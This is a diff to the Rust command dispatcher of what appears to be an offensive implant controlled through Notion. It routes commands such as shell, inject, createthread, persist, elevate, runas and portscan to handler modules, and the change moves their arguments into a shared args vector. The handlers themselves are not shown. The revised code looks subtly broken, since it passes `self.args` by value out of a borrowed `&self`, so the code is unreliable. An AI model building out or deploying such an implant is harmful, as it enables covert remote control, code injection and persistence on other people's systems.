@@ -26,23 +26,23 @@ mod createthread;
 
 /// All the possible command types. Some have command strings, and some don't.
 pub enum CommandType {
-    Cd(String),
-    Download(String),
-    Elevate(String),
+    Cd,
+    Download,
+    Elevate,
     Getprivs,
-    Inject(String),
-    CreateThread(String),
-    Portscan(String),
-    Persist(String),
+    Inject,
+    CreateThread,
+    Portscan,
+    Persist,
     Ps,
     Pwd,
-    Save(String),
-    Runas(String),
-    Shell(String),
+    Save,
+    Runas,
+    Shell,
     Shutdown,
-    Sleep(String),
+    Sleep,
     Whoami,
-    Unknown(String)
+    Unknown
 }
 
 /// Simple errors for the construction of a NotionCommand.
@@ -61,6 +61,7 @@ impl Error for CommandError {}
 /// The command itself, containing the `CommandType` enum
 pub struct NotionCommand {
     pub command_type: CommandType,
+    pub args: Vec<String>
 }
 
 impl NotionCommand {
@@ -72,31 +73,31 @@ impl NotionCommand {
         // The call to this function clears the target emoji
         // TODO: Maybe do that here?
         if let Some(t) = command_words.nth(0) {
-            let command_string = String::from(
-                command_words.collect::<Vec<&str>>()
-                .as_slice()
-                .join::<&str>(" ")
-            );
+
+            let command_args: Vec<String> = command_words
+            .map(|a| a.trim().to_string())
+            .collect();
+
             let command_type: CommandType = match t {
-                "cd"       => CommandType::Cd(command_string),
-                "createthread" => CommandType::CreateThread(command_string),
-                "download" => CommandType::Download(command_string),
-                "elevate"  => CommandType::Elevate(command_string),
+                "cd"       => CommandType::Cd,
+                "createthread" => CommandType::CreateThread,
+                "download" => CommandType::Download,
+                "elevate"  => CommandType::Elevate,
                 "getprivs" => CommandType::Getprivs,
-                "inject"   => CommandType::Inject(command_string),
-                "persist"  => CommandType::Persist(command_string),
-                "portscan" => CommandType::Portscan(command_string),
+                "inject"   => CommandType::Inject,
+                "persist"  => CommandType::Persist,
+                "portscan" => CommandType::Portscan,
                 "ps"       => CommandType::Ps,
                 "pwd"      => CommandType::Pwd,
-                "runas"    => CommandType::Runas(command_string),
-                "save"     => CommandType::Save(command_string),
-                "shell"    => CommandType::Shell(command_string),
+                "runas"    => CommandType::Runas,
+                "save"     => CommandType::Save,
+                "shell"    => CommandType::Shell,
                 "shutdown" => CommandType::Shutdown,
-                "sleep"    => CommandType::Sleep(command_string),
+                "sleep"    => CommandType::Sleep,
                 "whoami"   => CommandType::Whoami,
-                _          => CommandType::Unknown(command_string),
+                _          => CommandType::Unknown,
             };
-            return Ok(NotionCommand { command_type: command_type});
+            return Ok(NotionCommand { command_type: command_type, args: command_args});
 
         } else {
             Err(CommandError("Could not parse command!".to_string()))
@@ -105,23 +106,23 @@ impl NotionCommand {
     /// Executes the appropriate function for the `command_type`. 
     pub async fn handle(&self, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {
         match &self.command_type {
-            CommandType::Cd(s)       => cd::handle(&s),
-            CommandType::Download(s) => download::handle(&s, logger).await,
-            CommandType::Elevate(s)  => elevate::handle(&s, config_options).await,
+            CommandType::Cd       => cd::handle(self.args),
+            CommandType::Download => download::handle(self.args, logger).await,
+            CommandType::Elevate  => elevate::handle(self.args, config_options).await,
             CommandType::Getprivs    => getprivs::handle().await,
-            CommandType::Inject(s)   => inject::handle(&s, logger).await,
-            CommandType::Persist(s)  => persist::handle(&s, config_options, logger).await,
-            CommandType::Portscan(s) => portscan::handle(&s, logger).await,
+            CommandType::Inject   => inject::handle(self.args, logger).await,
+            CommandType::Persist  => persist::handle(self.args, config_options, logger).await,
+            CommandType::Portscan => portscan::handle(self.args, logger).await,
             CommandType::Ps          => ps::handle().await,
             CommandType::Pwd         => pwd::handle().await,
-            CommandType::Runas(s)    => runas::handle(&s).await,
-            CommandType::Save(s)     => save::handle(&s, config_options).await,
-            CommandType::Shell(s)    => shell::handle(&s).await,
+            CommandType::Runas    => runas::handle(self.args).await,
+            CommandType::Save     => save::handle(self.args, config_options).await,
+            CommandType::Shell    => shell::handle(self.args).await,
             CommandType::Shutdown    => shutdown::handle().await,
-            CommandType::Sleep(s)    => sleep::handle(&s, config_options).await,
+            CommandType::Sleep    => sleep::handle(self.args, config_options).await,
             CommandType::Whoami      => whoami::handle().await,
-            CommandType::Unknown(_)  => unknown::handle().await,
-            CommandType::CreateThread(s) => createthread::handle(&s, logger).await 
+            CommandType::Unknown  => unknown::handle().await,
+            CommandType::CreateThread => createthread::handle(self.args, logger).await 
         }
     }
 }
